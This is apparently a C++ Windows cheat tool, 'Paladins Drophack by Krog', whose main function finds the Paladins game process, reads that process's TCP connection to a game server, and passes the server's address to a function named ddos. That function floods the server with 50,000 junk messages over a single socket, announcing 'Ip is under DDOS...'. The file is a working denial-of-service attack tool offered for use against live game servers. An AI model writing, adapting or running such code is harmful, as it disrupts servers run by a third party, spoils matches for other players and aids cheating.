#pragma warning(disable:4996) 

#include <iostream>

#include <winsock2.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))

#define DEFAULT_BUFLEN 512

BOOL IsProcessRunning(DWORD pid)
{
    HANDLE process = OpenProcess(SYNCHRONIZE, FALSE, pid);
    DWORD ret = WaitForSingleObject(process, 0);
    CloseHandle(process);
    return ret == WAIT_TIMEOUT;
}

bool ddos(u_short remote_port, char* remote_address)
{
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 0xA);

    int iResult;
    WSADATA wsaData;

    SOCKET ConnectSocket = INVALID_SOCKET;
    struct sockaddr_in clientService;

    int recvbuflen = DEFAULT_BUFLEN;
    char* sendbuf = (char*)"\\\\\\\\\\\\FTP Message\\\\\\\\\\\\";
    char recvbuf[DEFAULT_BUFLEN] = "";

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != NO_ERROR) {
        return false;
    }
    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        return false;
    }

    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr(remote_address);
    clientService.sin_port = htons(remote_port);

    iResult = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        WSACleanup();
        return false;
    }

    std::cout << "Ip is under DDOS..." << std::endl;

    for (unsigned int i = 0; i < 50000; ++i) {
        iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
    }
       
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        WSACleanup();
        return false;
    }

    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        WSACleanup();
        return false;
    }

    do {
        iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
    } while (iResult > 0);

    iResult = closesocket(ConnectSocket);
    if (iResult == SOCKET_ERROR) {
        WSACleanup();
        return false;
    }

    WSACleanup();

    return true;
}

int main()
{
    PMIB_TCPTABLE2 pTcpTable;
    ULONG ulSize = 0;
    DWORD dwRetVal = 0,
          processId;
    HWND winHwnd;

    char szLocalAddr[128];
    char szRemoteAddr[128];

    struct in_addr IpAddr;

    int i;

    bool IsDone = false;

    std::cout << "Paladins Drophack by Krog" << std::endl;

    std::cout << "Finding game window..." << std::endl;
    winHwnd = FindWindowA(NULL, "Paladins (64-bit, DX11)");
    GetWindowThreadProcessId(winHwnd, &processId);

    if (!IsProcessRunning(processId)) {
        std::cout << "Game window could not be found. (dx11)" << std::endl;

        winHwnd = FindWindowA(NULL, "Paladins (64-bit, DX9)");
        GetWindowThreadProcessId(winHwnd, &processId);

        if (!IsProcessRunning(processId)) {
            std::cout << "Game window could not be found. (dx9)" << std::endl;
            return 1;
        }
    }

    pTcpTable = (MIB_TCPTABLE2*)MALLOC(sizeof(MIB_TCPTABLE2));
    if (pTcpTable == NULL) {
        std::cout << "pTcpTable is null." << std::endl;
        return 1;
    }

    ulSize = sizeof(MIB_TCPTABLE);
    if ((dwRetVal = GetTcpTable2(pTcpTable, &ulSize, TRUE)) ==
        ERROR_INSUFFICIENT_BUFFER) {
        FREE(pTcpTable);
        pTcpTable = (MIB_TCPTABLE2*)MALLOC(ulSize);
        if (pTcpTable == NULL) {
            return 1;
        }
    }

    std::cout << "Finding current game Ip..." << std::endl;

    if ((dwRetVal = GetTcpTable2(pTcpTable, &ulSize, TRUE)) == NO_ERROR) {
        for (i = 0; i < (int)pTcpTable->dwNumEntries; i++) {

            IpAddr.S_un.S_addr = (u_long)pTcpTable->table[i].dwRemoteAddr;
            strcpy_s(szRemoteAddr, sizeof(szRemoteAddr), inet_ntoa(IpAddr));

            if (pTcpTable->table[i].dwOwningPid == processId)
            {
                if (ntohs((u_short)pTcpTable->table[i].dwRemotePort) > 9000 && ntohs((u_short)pTcpTable->table[i].dwRemotePort) < 10000) {
                    std::cout << "Ip found = " << (char*)szRemoteAddr << ":" << ntohs((u_short)pTcpTable->table[i].dwRemotePort) << std::endl;
             
                    ddos(ntohs((u_short)pTcpTable->table[i].dwRemotePort), (char*)szRemoteAddr);
                    IsDone = true;
                }
            }
        }
    }
    else {
        FREE(pTcpTable);
        return 1;
    }

    if (pTcpTable != NULL) {
        FREE(pTcpTable);
        pTcpTable = NULL;
    }

    if (!IsDone) {
        std::cout << "Game ip could not be found, be sure you\'re in game..." << std::endl;
    }

    system("pause");
    return 0;
}